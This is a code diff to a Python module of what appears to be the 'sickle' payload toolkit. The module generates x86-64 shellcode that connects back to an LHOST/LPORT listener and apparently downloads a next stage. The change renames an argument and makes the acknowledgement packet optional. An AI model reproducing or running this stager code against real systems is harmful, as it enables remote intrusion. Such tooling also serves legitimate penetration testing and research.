@@ -3,7 +3,7 @@ import math
 import ctypes
 import struct
 
-from sickle.common.lib.generic import extract 
+from sickle.common.lib.generic import extract
 from sickle.common.lib.generic import convert 
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.reversing import mappings 
@@ -67,9 +67,9 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
-    arguments["ACKPK"] = {}
-    arguments["ACKPK"]["optional"] = "yes"
-    arguments["ACKPK"]["description"] = "File including it's path containing the acknowledgement packet response"
+    arguments["ACK_PACKET"] = {}
+    arguments["ACK_PACKET"]["optional"] = "yes"
+    arguments["ACK_PACKET"]["description"] = "File including it's path containing the acknowledgement packet response"
 
     def __init__(self, arg_object):
 
@@ -114,12 +114,12 @@ class Shellcode():
         if (argv_dict == None):
             exit(-1)
 
-        if ("ACKPK" not in argv_dict.keys()):
-            self.ack_packet = "ACK\r\n"
+        if ("ACK_PACKET" not in argv_dict.keys()):
+            self.ack_packet = None
+            needed_space = 0x00
         else:
-            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACKPK"], 'r')
-
-        needed_space = math.ceil(len(self.ack_packet)/8) * 8
+            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACK_PACKET"], 'r')
+            needed_space = math.ceil(len(self.ack_packet)/8) * 8
 
         return needed_space
 
@@ -138,7 +138,7 @@ class Shellcode():
 
         sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
         sin_port = struct.pack('<H', lport).hex()
-        sin_family = struct.pack('>H', bits_socket.AF_INET).hex() # AF_INET
+        sin_family = struct.pack('>H', bits_socket.AF_INET).hex()
 
         source_code = f"""
 _start:
@@ -195,32 +195,33 @@ connect:
     syscall
         """
 
-        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
-        write_index = self.storage_offsets['buffer']
+        if self.ack_packet != None:
+            packet_buffer = convert.from_str_to_xwords(self.ack_packet)
+            write_index = self.storage_offsets['buffer']
 
-        source_code += "\ninit_download:\n"
+            source_code += "\ninit_download:\n"
 
-        for i in range(len(packet_buffer["QWORD_LIST"])):
-            source_code += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
-            source_code += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
+            for i in range(len(packet_buffer["QWORD_LIST"])):
+                source_code += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
+                source_code += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+                write_index -= 8
 
-        for i in range(len(packet_buffer["DWORD_LIST"])):
-            source_code += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
-            source_code += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
+            for i in range(len(packet_buffer["DWORD_LIST"])):
+                source_code += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
+                source_code += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+                write_index -= 4
 
-        for i in range(len(packet_buffer["WORD_LIST"])):
-            source_code += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
-            source_code += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
+            for i in range(len(packet_buffer["WORD_LIST"])):
+                source_code += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
+                source_code += "    mov [rbp-{}], cx\n".format(hex(write_index))
+                write_index -= 2
 
-        for i in range(len(packet_buffer["BYTE_LIST"])):
-            source_code += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
-            source_code += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
+            for i in range(len(packet_buffer["BYTE_LIST"])):
+                source_code += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
+                source_code += "    mov [rbp-{}], cl\n".format(hex(write_index))
+                write_index -= 1
 
-        source_code += f"""
+            source_code += f"""
     ; RAX = write(int fd,                 // RAX
     ;             const void buf[.count], // RSI
     ;             size_t count);          // RDX
@@ -231,8 +232,8 @@ connect:
     mov rdx, {len(self.ack_packet)}
     mov rax, {self.syscalls['write']}
     syscall
-        """
-
+            """
+        
         source_code += f"""
 set_index:
     xor r14, r14
